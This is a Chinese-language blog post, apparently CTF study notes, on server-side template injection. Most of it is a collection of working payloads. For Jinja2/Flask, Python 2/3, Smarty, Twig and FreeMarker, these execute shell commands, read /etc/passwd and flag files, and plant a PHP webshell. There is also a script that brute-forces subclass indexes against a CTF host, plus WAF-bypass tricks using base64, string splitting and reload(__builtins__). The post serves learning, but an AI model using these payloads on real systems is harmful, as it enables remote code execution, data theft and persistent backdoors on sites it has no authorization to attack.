---
title: SSTI学习(二)
categories: web漏洞
---
## 一：常见SSTI魔术方法

```bash
 __class__  返回类型所属的对象
 __mro__    返回一个包含对象所继承的基类元组，法 在解析时按照元组的顺序解析。
 __base__   返回该对象所继承的基类   // __base__和__mro__都是用来寻找基类的

 __subclasses__   每个新类都保留了子类的引用，这个方法返回一个类中仍然可用的的引用的列表
 __init__  类的初始化方法
 __globals__  对包含函数全局变量的字典的引用  
 __builtins__ 即是引用，可直接调用，Python程序一旦启动，它就会在程序员所写的代码没有运行之前就已经被加载到内存中了,而对于builtins却不用导入，它在任何模块都直接可见，所以可以直接调用引用的模块
```

<!--more-->
---
## 二：获取基类方法

```bash
[].__class__.__base__
''.__class__.__mro__[2]
().__class__.__base__
{}.__class__.__base__

request.__class__.__mro__[8] 　　//针对jinjia2/flask为[9]适用
或者
[].__class__.__bases__[0]       //其他的类似
```

---
## 三：获取基本类的子类

```bash
>>>[].__class__.__base__.__subclasses__()
```
这里回显了很长一个列表，这里可以将这些数据放在列表中

ssti的主要目的就是从这么多的子类中找出可以利用的类（一般是指读写文件的类）加以利用。

那么我们可以利用的类有哪些呢？

---
## 四：寻找可利用的类
Python 的版本不同，可利用类的位置也是不同的。所以每一回都要找可利用类的位置。可以用脚本遍历：

寻找 popen：

```bash
import requests
import time
import html

for i in range(1, 500):
    url = "http://51d49043-d919-40c5-a17a-ae90387c6a3e.node3.buuoj.cn/?search={{''.__class__.__mro__[2].__subclasses__()["+str(i)+"]}}"
    req = requests.get(url)
    time.sleep(0.1)
    # 这里是找subprocess.Popen
    if "subprocess.Popen" in html.escape(req.text):
        print(i)
        print(html.unescape(req.text))
        break

```

寻找 os：

```bash
#!/usr/bin/env python
# encoding: utf-8

num = 0
for item in ''.__class__.__mro__[2].__subclasses__():
    try:
         if 'os' in item.__init__.__globals__:
             print num,item
         num+=1
    except:
        print '-'
        num+=1

```

>os模块提供了多数操作系统的功能接口函数。当os模块被导入后，它会自适应于不同的操作系统平台，根据不同的平台进行相应的操作，在python编程时，经常和文件、目录打交道，这时就离不了os模块

---
## 五：利用方法
 找到位置即可直接调用命令

1, **<type ‘file’>**

File位置一般在40 可直接调用

```bash
 [].__class__.__base__.__subclasses__()[40]('/etc/passwd').read()
```

2, **<class ‘site._Printer’>**

直接用os的popen执行命令：

```bash
{{[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls').read()}}

[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('ls /flasklight').read()

[].__class__.__base__.__subclasses__()[71].__init__['__glo'+'bals__']['os'].popen('cat coomme_geeeett_youur_flek').read()

如果system被过滤，用os的listdir读取目录+file模块读取文件：
().__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].listdir('.')

```


3, **<class ‘subprocess.Popen’>**

位置一般在258：

```bash
{{''.__class__.__mro__[2].__subclasses__()[258]('ls',shell=True,stdout=-1).communicate()[0].strip()}}

{{''.__class__.__mro__[2].__subclasses__()[258]('ls /flasklight',shell=True,stdout=-1).communicate()[0].strip()}}

{{''.__class__.__mro__[2].__subclasses__()[258]('cat /flasklight/coomme_geeeett_youur_flek',shell=True,stdout=-1).communicate()[0].strip()}}
```

4, **<class ‘warnings.catch_warnings’>**

一般位置为59，可以用它来调用file、os、eval、commands等

调用 file：

```bash
''.__class__.__mro__[2].__subclasses__()[59].__init__.__globals__['__builtins__']['file']('/etc/passwd').read()      #把 read() 改为 write() 就是写文件
```

Import os：

```bash
[].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__']['__imp'+'ort__']('os').__dict__['pop'+'en']('ls /').read()
```

调用 eval：

```bash
[].__class__.__base__.__subclasses__()[59].__init__['__glo'+'bals__']['__builtins__']['eval']("__import__('os').popen('ls').read()")

[].__class__.__base__.__subclasses__()[189].__init__.__globals__['__builtins__']['ev'+'al']('__imp'+'ort__("os").po'+'pen("ls ./").read()')

```

调用system方法。（不包含system，可以绕过过滤system的情况）：

```bash
[].__class__.__base__.__subclasses__()[59].__init__.__globals__['linecache'].__dict__.values()[12].__dict__.values()[144]('whoami')
```
利用commands进行命令执行：

```bash
{}.__class__.__bases__[0].__subclasses__()[59].__init__.__globals__['__builtins__']['__import__']('commands').getstatusoutput('ls')
```

---
## 六：Payload 大全
1，jinja2 通用：(python) :

```bash
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].eval("__import__('os').popen('<command>').read()") }}{% endif %}{% endfor %}

{{[self['\137TemplateReference\137\137context']]}} 终极过滤: \x () _ 无法rce，只能读文件
```

---
2，python2:

```bash
[].__class__.__base__.__subclasses__()[71].__init__.__globals__['os'].system('ls')

[].__class__.__base__.__subclasses__()[76].__init__.__globals__['os'].system('ls')

"".__class__.__mro__[-1].__subclasses__()[60].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')

"".__class__.__mro__[-1].__subclasses__()[61].__init__.__globals__['__builtins__']['eval']('__import__("os").system("ls")')

"".__class__.__mro__[-1].__subclasses__()[40](filename).read()

"".__class__.__mro__[-1].__subclasses__()[29].__call__(eval,'os.system("ls")')

```

---
3，python3:

```bash
''.__class__.__mro__[2].__subclasses__()[59].__init__.func_globals.values()[13]['eval']

"".__class__.__mro__[-1].__subclasses__()[117].__init__.__globals__['__builtins__']['eval']
```

---
4，smarty 模块 (PHP) ：

见第一届四叶草牛年ctf web-get

[smarty模块注入详解](https://blog.csdn.net/qq_45521281/article/details/107556915)

漏洞确认(查看smarty的版本号)：
```bash
 {$smarty.version}
```
常规 （使用{php}{/php}标签来执行被包裹其中的php指令，smarty3弃用）：
```bash
 {php}phpinfo;{/php}
```
Php5可用，php7弃用：
```bash
 <script language="php">phpinfo();</script>
```
通用，{if} 标签：
```bash
 {if phpinfo()}{/if}
 {if system('ls')}{/if}
 {if system('cat /flag')}{/if}
 {Smarty_Internal_Write_File::writeFile($SCRIPT_NAME,"<?php passthru($_GET['cmd']); ?>",self::clearConfig())}
```

---
5，twig  (PHP)

```bash
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("cat /flag")}}
```

---
6，FreeMarker (PHP)

```bash
<#assign ex="freemarker.template.utility.Execute"?new()> ${ ex("id") }
uid=119(tomcat7) gid=127(tomcat7) groups=127(tomcat7)
```


---
## 七：WAF绕过

Base64：

```bash
().__class__.__bases__[0].__subclasses__()[40]('r','ZmxhZy50eHQ='.decode('base64')).read()
相当于:
().__class__.__bases__[0].__subclasses__()[40]('r','flag.txt')).read()

```

---
字符串拼接：

+号：

```bash
().__class__.__bases__[0].__subclasses__()[40]('r','fla'+'g.txt')).read()
  
相当于
().__class__.__bases__[0].__subclasses__()[40]('r','flag.txt')).read()

```

[::-1] 取反：

```bash
{% for c in [].__class__.__base__.__subclasses__() %}{% if c.__name__=='catch_warnings' %}{{ c.__init__.__globals__['__builtins__'].open('txt.galf_eht_si_siht/'[::-1],'r').read() }}{% endif %}{% endfor %}
```

---

Reload：

```bash
del __builtins__.__dict__['__import__'] # __import__ is the function called by the import statement
 
del __builtins__.__dict__['eval'] # evaluating code could be dangerous
del __builtins__.__dict__['execfile'] # likewise for executing the contents of a file
del __builtins__.__dict__['input'] # Getting user input and evaluating it might be dangerous

```
当没有过滤reload函数时，我们可以重载builtins
```bash
 reload(__builtins__)
```


当不能通过
```
 [].class.base.subclasses([60].init.func_globals[‘linecache’].dict.values()[12]直接加载 os 模块
```
这时候可以使用getattribute+ 字符串拼接 / base64 绕过 例如:

```bash
[].__class__.__base__.__subclasses__()[60].__init__.__getattribute__('func_global'+'s')['linecache'].__dict__.values()[12]

等价于：
[].__class__.__base__.__subclasses__()[60].__init__.func_globals['linecache'].__dict__.values()[12]

```

---
## 八：参考

[模板注入总结](https://blog.csdn.net/qq_44657899/article/details/104307948)

[从零开始的 ssti 学习](https://www.cnblogs.com/cioi/p/12308518.html#a1)

